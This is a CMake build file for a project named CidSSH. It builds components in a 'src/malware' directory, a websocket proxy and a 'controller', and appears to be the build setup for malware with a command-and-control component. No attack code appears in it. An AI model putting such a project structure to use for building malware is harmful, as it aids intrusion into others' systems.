cmake_minimum_required(VERSION 3.13)

project(CidSSH)

# Find out if we have threading available
set(CMAKE_THREAD_PREFER_PTHREADS ON)
find_package(Threads)

if (Threads_FOUND)
 set(HAVE_PTHREAD 1)
endif ()

# config.h checks
configure_file(src/config.h.cmake src/config.h)
#include_directories(${CMAKE_CURRENT_BINARY_DIR}/src)

if(NOT ${CMAKE_SYSTEM_NAME} MATCHES "Windows")
	option(BUILD_CONTROLER "Build the CidSSH controller" ON)
	option(BUILD_WS_PROXY "Build the Websocket proxy server" ON)
endif()

option(CID_WEBSOCKETS "Build CidSSH with Websockets encapsulation" ON)

add_subdirectory(src/malware)


add_subdirectory(src/malware/websockets/ws_proxy_server) #ToDo remove this. just testing in windows

if(NOT ${CMAKE_SYSTEM_NAME} MATCHES "Windows")
	if(${BUILD_CONTROLER})
		add_subdirectory(src/controller)
	endif()
	if(${BUILD_WS_PROXY})
		add_subdirectory(src/malware/websockets/ws_proxy_server)
	endif()
	
endif()
